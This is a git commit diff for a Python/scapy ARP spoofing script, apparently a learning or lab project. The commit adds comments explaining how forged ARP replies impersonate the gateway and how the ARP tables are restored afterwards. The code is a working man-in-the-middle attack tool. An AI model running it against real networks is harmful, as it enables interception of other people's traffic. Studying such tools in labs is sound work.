9aff0b26541a28a190200c2928a7d67c8ce87716
Vhackenstance <hackenstance@proton.me>
2026-04-14 03:39:23 -0500

    Housekeeping

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,8 +2,9 @@
 from __future__ import print_function # mitigate syntax error from using *end=""*
 import time
 import sys
-from utils.scapy_utils import spoof, get_mac, check_port_forwarding, restore
+from utils.scapy_utils_commented import spoof, get_mac, check_port_forwarding, restore
 
+# Target IP and gateway, which you would get using if(ip)config.
 target_ip = "192.168.63.174"
 gateway_ip = "192.168.63.2"
 
@@ -17,8 +18,8 @@ try:
         sent_packets_count += 2
         print("\r[+] Packets set: " + str(sent_packets_count), end=""), # Use ,end="" for python 3
         sys.stdout.flush()
-        time.sleep(2) # Can quit by pressing Ctrl+c
-except KeyboardInterrupt:
+        time.sleep(2)
+except KeyboardInterrupt: # Can quit by pressing Ctrl+C, manage that
     print("\n[-] Detected CTRL+C ... Resetting ARM tables..... Please wait.\n")
-    restore(target_ip, gateway_ip, get_mac)
+    restore(target_ip, gateway_ip, get_mac) # Scrub it clean, restore original settings.
     restore(gateway_ip, target_ip, get_mac)
--- utils/scapy_utils_commented.py
+++ utils/scapy_utils_commented.py
@@ -16,7 +16,7 @@ def check_port_forwarding():
             exit()
     except OSError:
         print(
-            "The file /proc/sys/net/ipv4/ip_forward was not found. System may not support IP forwarding or is not Linux.")
+            "The file /proc/sys/net/ipv4/ip_forward was not found. System may not support IP forwarding, or is not Linux or Mac.")
     except Exception as e:
         print("An error occurred while trying to connect to IPv4. " + str(e))
 
@@ -29,15 +29,23 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip, get_mac_address):
     target_mac = get_mac_address(target_ip)
+    # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
+    # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
+    # psrc=[SPOOF_IP](GATEWAY_IP) > tells the target I am the router
     packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     sendp(packet, verbose=False)
 
-def restore(destination_ip, source_ip, get_mac_address):
-    target_mac = get_mac_address(destination_ip)
+# 2. When we quit, restore the ARP tables in the router and the target.
+def restore(destination_ip, source_ip, get_mac_address): # Gonna call this with import get_mac
+    target_mac = get_mac_address(destination_ip) # Using get_mac from above here
     source_mac = get_mac_address(source_ip)
+    # Creating an ARP Response (op to 2), with the following fields (arguments)
+    # pdst: IP Destination.
+    # hwdst: HW (MAC Address) Destination.
+    # psrc: IP Source.
+    # hwsrc: MAC Address Source.  Essential otherwise Kali will still set the source MAC as my MAC.
     packet = Ether(dst=target_mac) / ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
+    # count is 4, send the packet 4 times to make sure the target will receive it.
     sendp(packet, count=4, verbose=False)
-
-
 
 
